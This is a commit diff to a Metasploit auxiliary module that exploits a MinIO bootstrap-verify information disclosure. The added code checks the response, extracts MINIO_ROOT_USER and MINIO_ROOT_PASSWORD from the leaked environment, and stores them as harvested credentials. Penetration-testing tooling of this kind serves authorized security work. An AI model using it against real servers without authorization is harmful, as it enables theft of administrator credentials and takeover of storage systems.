980c5053f4253a00d8b5338f0217b1d77fa5b470
cudalac <outn2015@gmail.com>
2024-03-08 08:54:38 -0500

    Peer Review

--- modules/auxiliary/gather/minio_bootstrap_verify_info_disc.rb
+++ modules/auxiliary/gather/minio_bootstrap_verify_info_disc.rb
@@ -47,6 +47,31 @@ class MetasploitModule < Msf::Auxiliary
     )
   end
 
+  def report_cred(opts)
+    service_data = {
+      address: rhost,
+      port: rport,
+      service_name: 'MinIO',
+      protocol: 'tcp',
+      workspace_id: myworkspace_id
+    }
+
+    credential_data = {
+      origin_type: :service,
+      module_fullname: fullname,
+      username: opts['user'],
+      private_data: opts['password'],
+      private_type: :password
+    }.merge(service_data)
+
+    login_data = {
+      core: create_credential(credential_data),
+      status: Metasploit::Model::Login::Status::UNTRIED
+    }.merge(service_data)
+
+    create_credential_login(login_data)
+  end
+
   def run
     vprint_status('Sending Request')
     res = send_request_cgi(
@@ -57,11 +82,19 @@ class MetasploitModule < Msf::Auxiliary
     fail_with(Failure::UnexpectedReply, "#{peer} - Unexpected Response (response code: #{res.code})") unless res.code == 200
 
     json = res.get_json_document
+
+    fail_with(Failure::UnexpectedReply, "#{peer} - Unexpected JSON Object") unless json.key? 'MinioEnv'
+
+    creds = {}
+
     json['MinioEnv'].each do |key, value|
       print_good("#{key}: #{value}")
+      creds['user'] = value if key == 'MINIO_ROOT_USER'
+      creds['password'] = value if key == 'MINIO_ROOT_PASSWORD'
     end
 
     path = store_loot('minio.env.json', 'application/json', rhost, json, 'minio.env.json', 'MinIO Environmental Variables Json')
+    report_cred(creds) if creds.key?('user') && creds.key?('password')
     print_good("MinIO Environmental Variables Json Saved to: #{path}")
   end
 end
